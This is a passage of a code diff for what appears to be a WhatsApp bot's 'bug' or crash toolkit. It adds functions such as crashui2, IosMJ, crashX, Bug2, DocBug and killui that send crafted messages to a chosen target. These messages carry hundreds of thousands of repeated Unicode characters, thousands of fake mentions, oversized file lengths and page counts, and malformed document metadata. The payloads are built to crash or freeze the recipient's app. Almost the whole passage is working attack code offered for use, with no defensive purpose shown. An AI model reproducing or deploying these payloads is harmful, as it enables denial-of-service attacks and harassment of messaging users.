⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
+								},
+								nativeFlowMessage: {
+									messageParamsJson: "{}",
+								},
+								contextInfo: {
+									mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
+										length: 10000
+									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+									forwardingScore: 1,
+									isForwarded: true,
+									fromMe: false,
+									participant: "0@s.whatsapp.net",
+									remoteJid: "status@broadcast",
+									quotedMessage: {
+										documentMessage: {
+											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+											fileLength: "9999999999999",
+											pageCount: 1316134911,
+											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+											fileName: "\u0000",
+											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+											mediaKeyTimestamp: "1724474503",
+											contactVcard: true,
+											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+											jpegThumbnail: "",
+										},
+									},
+								},
+							},
+						},
+					},
+				},
+				{
+					participant: {
+						jid: target
+					}
+				}
+			);
+		};
+	async function crashui2(target, ptcp = false) {
+    await Xlesy.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(300000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+async function IosMJ(target, Ptcp = false) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          extendedTextMessage: {
+            text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "".repeat(90000),
+            contextInfo: {
+              stanzaId: "1234567890ABCDEF",
+              participant: "0@s.whatsapp.net",
+              quotedMessage: {
+                callLogMesssage: {
+                  isVideo: true,
+                  callOutcome: "1",
+                  durationSecs: "0",
+                  callType: "REGULAR",
+                  participants: [
+                    {
+                      jid: "0@s.whatsapp.net",
+                      callOutcome: "1",
+                    },
+                  ],
+                },
+              },
+              remoteJid: target,
+              conversionSource: "source_example",
+              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
+              conversionDelaySeconds: 10,
+              forwardingScore: 99999999,
+              isForwarded: true,
+              quotedAd: {
+                advertiserName: "Example Advertiser",
+                mediaType: "IMAGE",
+                jpegThumbnail:
+                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+                caption: "This is an ad caption",
+              },
+              placeholderKey: {
+                remoteJid: "0@s.whatsapp.net",
+                fromMe: false,
+                id: "ABCDEF1234567890",
+              },
+              expiration: 86400,
+              ephemeralSettingTimestamp: "1728090592378",
+              ephemeralSharedSecret:
+                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+              externalAdReply: {
+                title: "Ueheheheeh",
+                body: "Kmu Ga Masalah Kan?" + "".repeat(200),
+                mediaType: "VIDEO",
+                renderLargerThumbnail: true,
+                previewTtpe: "VIDEO",
+                thumbnail:
+                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+                sourceType: " x ",
+                sourceId: " x ",
+                sourceUrl: "Https://t.me/GxyenDev",
+                mediaUrl: "Https://t.me/GxyenDev",
+                containsAutoReply: true,
+                renderLargerThumbnail: true,
+                showAdAttribution: true,
+                ctwaClid: "ctwa_clid_example",
+                ref: "ref_example",
+              },
+              entryPointConversionSource: "entry_point_source_example",
+              entryPointConversionApp: "entry_point_app_example",
+              entryPointConversionDelaySeconds: 5,
+              disappearingMode: {},
+              actionLink: {
+                url: "Https://t.me/GxyenDev",
+              },
+              groupSubject: "Example Group Subject",
+              parentGroupJid: "6287888888888-1234567890@g.us",
+              trustBannerType: "trust_banner_example",
+              trustBannerAction: 1,
+              isSampled: false,
+              utm: {
+                utmSource: "utm_source_example",
+                utmCampaign: "utm_campaign_example",
+              },
+              forwardedNewsletterMessageInfo: {
+                newsletterJid: "6287888888888-1234567890@g.us",
+                serverMessageId: 1,
+                newsletterName: " target ",
+                contentType: "UPDATE",
+                accessibilityText: " target ",
+              },
+              businessMessageForwardInfo: {
+                businessOwnerJid: "0@s.whatsapp.net",
+              },
+              smbcayCampaignId: "smb_cay_campaign_id_example",
+              smbServerCampaignId: "smb_server_campaign_id_example",
+              dataSharingContext: {
+                showMmDisclosure: true,
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+              },
+            }
+          : {}
+      );
+    }
+
+async function crashX(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+ "documentMessage": {
+ "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+ "mimetype": "penis",
+ "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+ "fileLength": "999999999",
+ "pageCount": 999999999,
+ "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+ "fileName": `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷.xp`+"ྦྷ".repeat(60000),
+ "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+ "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+ "mediaKeyTimestamp": "1715880173"
+ }
+}), { userJid: target, quoted: kuwoted });
+await Xlesy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function crashbeta(target, ptcp = false) {
+let BetaFc = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(250000);
+
+const messageContent = {
+    ephemeralMessage: {
+        message: {
+            viewOnceMessage: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: 0,
+                        caption: BetaFc,
+                        sequenceNumber: "",
+                        jpegThumbnail: null
+                    },
+                    body: {
+                        text: BetaFc
+                    },
+                    nativeFlowMessage: {}, // If needed, specify more details here
+                    contextInfo: {
+                     contactVcard: true,
+                        mentionedJid: [m.chat],
+                        groupMentions: [
+                            { 
+                                groupJid: "@120363321780343299@g.us", 
+                                groupSubject: "Gxyenn nih deck" 
+                            }
+                        ]
+                    }
+                }
+            }
+        }
+    }
+}
+}
+async function Bug2(target, ptcp = false) {
+    let akumw = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦿꦾ꧀".repeat(50000);
+    await Xlesy.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: " TrashDex Explanation ",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "",
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: akumw
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+
+async function DocBug(target) {
+ let virtex = "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷";
+   Xlesy.relayMessage(target, {
+     groupMentionedMessage: {
+       message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                                    fileLength: "99999999999",
+                                    pageCount: 0x9184e729fff,
+                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                                    fileName: virtex,
+                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                                    mediaKeyTimestamp: "1715880173",
+                                    contactVcard: true
+                                },
+                                hasMediaAttachment: true
+                            },
+                            body: {
+                                text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" + "ꦾ".repeat(100000) + "@1".repeat(300000)
+                            },
+                            nativeFlowMessage: {},
+                            contextInfo: {
+                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
+                            }
+                        }
+                    }
+                }
+            }, { participant: { jid: target } });
+        };
+async function LocaBugs(target) {
+ await Xlesy.relayMessage(target, {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        locationMessage: {
+                            degreesLatitude: 0,
+                            degreesLongitude: 0
+                        },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: `🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷`+'ꦾ'.repeat(100000)
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷" }]
+                    }
+                }
+            }
+        }
+    }, { participant: { jid: target } }, { messageId: null });
+}
+async function killui(target, Ptcp = true) {
+      await Xlesy.relayMessage(
+        target,
+        {
+          ephemeralMessage: {
+            message: {
+              interactiveMessage: {
+                header: {
+                  documentMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+                    mimetype:
+                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                    fileLength: "9999999999999",
+                    pageCount: 1316134911,
+                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+                    fileName: "⿻",
+                    fileEncSha256:
+                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+                    directPath:
+                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1726867151",
+                    contactVcard: true,
+                    jpegThumbnail: fs.readFileSync("./lib/media/image/Gxyenn.png"),
+                  },
+                  hasMediaAttachment: true,
+                },
+                body: {
+                  text: "⿻🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ ̷X̷l̷e̷s̷y̷V̷I̷P̷\n" + "ꦾ".repeat(28000),
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "{}",
+                },
+                contextInfo: {
+                  mentionedJid: ["6289526156543@s.whatsapp.net"],
+                  forwardingScore: 1,
+                  isForwarded: true,
+                  fromMe: false,
+                  participant: "0@s.whatsapp.net",
+                  remoteJid: "status@broadcast",
+                  quotedMessage: {
+                    documentMessage: {
